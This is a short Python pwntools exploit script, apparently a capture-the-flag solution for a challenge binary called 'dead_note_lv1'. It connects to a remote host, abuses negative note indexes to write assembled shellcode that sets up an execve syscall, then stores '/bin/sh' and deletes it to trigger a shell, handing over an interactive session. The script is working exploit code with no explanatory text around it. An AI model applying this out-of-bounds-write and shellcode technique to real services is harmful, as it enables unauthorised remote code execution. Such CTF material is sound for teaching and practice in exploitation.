from pwn import *

#r = process(["./dead_note_lv1"])
#r = remote("159.89.197.67", 31337)
r = remote("159.89.197.67", 3333)
context.arch = "amd64"

def add(idx,num,text):
	r.sendlineafter(":","1")
	r.sendlineafter(":",str(idx))
	r.sendlineafter(":",str(num))
	if len(text)<8 :
		r.sendlineafter(":",text)
	else:
		r.sendafter(":",text)

def remove(idx):
	r.sendlineafter(":","2")
	r.sendlineafter(":",str(idx))

add(-0x17,1,asm("""
push rbx
pop rax
ret
"""))

add(-0x19,1,asm("""
push 0x3b
pop rax
push rbx
pop rsi
syscall
"""))

add(0,1,"/bin/sh")
remove(0)
r.interactive()
